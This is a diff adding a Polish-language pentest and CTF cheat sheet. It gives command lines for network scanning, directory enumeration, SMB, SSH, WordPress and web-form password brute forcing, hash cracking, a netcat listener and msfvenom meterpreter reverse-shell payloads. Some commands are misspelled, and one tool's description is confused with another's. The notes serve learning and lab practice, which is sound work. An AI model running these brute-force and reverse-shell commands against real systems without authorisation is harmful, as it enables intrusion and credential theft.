@@ -1,0 +1,81 @@
+PSPY64:
+pspy to narzędzie wiersza poleceń przeznaczone do szpiegowania procesów bez konieczności posiadania uprawnień administratora. 
+Pozwala zobaczyć polecenia wykonywane przez innych użytkowników, zadania cron itp. Podczas ich wykonywania. Doskonały do wyliczania systemów Linux w CTF
+./pspy64
+
+RESPONDER:
+Responder to wbudowane narzędzie Kali Linux do rozpoznawania nazw multiemisji Link-Local ( LLMNR ) i usługi nazw NetBIOS ( NBT-NS ), 
+które odpowiada na określone zapytania NetBIOS na podstawie żądania serwera plików
+
+responder -i eth0
+
+CRACKMAPEXEC:
+CredCrack   zbieracz danych uwierzytelniających. Eksfiltruje poświadczenia w sposób rekurencyjny w pamięci iw sposób wyraźny. 
+Po zakończeniu CredCrack przeanalizuje i wyśle poświadczenia,
+identyfikując uzyskanych administratorów domeny. CredCrack ma również możliwość wyświetlania i wyliczania dostępu do udziałów i tak, jest wielowątkowy!
+
+np: crackmapexec smb ip -u 'user' -p 'pasword'   wylicza smb
+crackmapex smb ip -u user.txt -p pass.txt  --continue-on-success | grep '[+] brutforsuje smb z plikow 
+crackmapexec ip/24  -u user.txt -p pass.txt  --continue-on-success | grep '[+]   szuka po calej sieci
+crackmapexec ssh    to samo tylko ssh
+
+
+
+CEWL: Przeszukuje dany adres URL do określonej głębokości i zwraca listę słów, które można następnie wykorzystać do łamania haseł.
+
+cewl -d 2 -m 5 -w list.txt   URL
+
+NC:
+nc -lvnp port
+
+Hashcat /John :
+hashcat -a 0 -m 1200   hash pass.txt    -a metoda -m numerhash
+john hash  --wordlist=pass.txt   --format=raw-sha1  lub inny 
+W john można edytować swoje metody np do tworzenia swoich list do brutforse np. dodawania liczb lub znaków specjainych do istniejeacyhc juz słów. 
+
+LINPEAS/WINPEAS
+Linux local Privilege Escalation Awesome Script (linPEAS) to skrypt, który wyszukuje możliwe ścieżki do eskalacji uprawnień na hostach Linux/Unix
+WINPEAS dla windowsa.
+
+NMAP: skaner sieci 
+nmap -sC -sV -p- ip 
+-A    -o    --script""  -T5  //   i inne w zależności od potrzeb skanwoania.
+https://www.tutorialspoint.com/nmap-cheat-sheet
+
+GOBUSTER: Identyfikatory URI (katalogi i pliki) w witrynach internetowych. Subdomeny DNS (z obsługą symboli wieloznacznych). Wirtualne nazwy hostów na docelowych serwerach WWW.
+
+gobuster dir -u ip  -w  /usr/share/wordlists/dirb/big.txt
+  /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php.html.txt
+gobuster vhost -u http://ip -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt   SUBDOMENY
+
+WPSCAN:WPScan skanuje zdalne instalacje WordPressa, aby znaleźć problemy z bezpieczeństwem
+wpscan --url http://ip/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt  --max-threads 50
+Wpsacn –-url url -e u vp
+WPSCAN BRUTEFORSE:Wpsacn –-url url -p pass.txt -u admin
+
+HYDRA: BRUTFORCE
+
+hydra -l admin -P pass.txt  ssh ip  
+Web:
+hydra -l admin -P pass.txt ip http-post-form "/admin/index.php:user=^USER^&pass=^PASS^&Login=Login:Username or password invalid" -V
+
+METASPLOIT: msfconsole -q  mozna wykorzystać wiele exploitow, wbudowane w meatasploicie.
+sluchacz np multi/handler
+paylody do metasploita np z MSFVENOM : 
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe   do WINDOWSA 
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf  LINUX
+Wiele innych:   https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+
+SEARCHSPLOIT:
+searchsploit  nazwa exploit 
+serachsploit -m nazwa exploit      - pobieranie
+
+
+
+
+
+
+
+
+
+
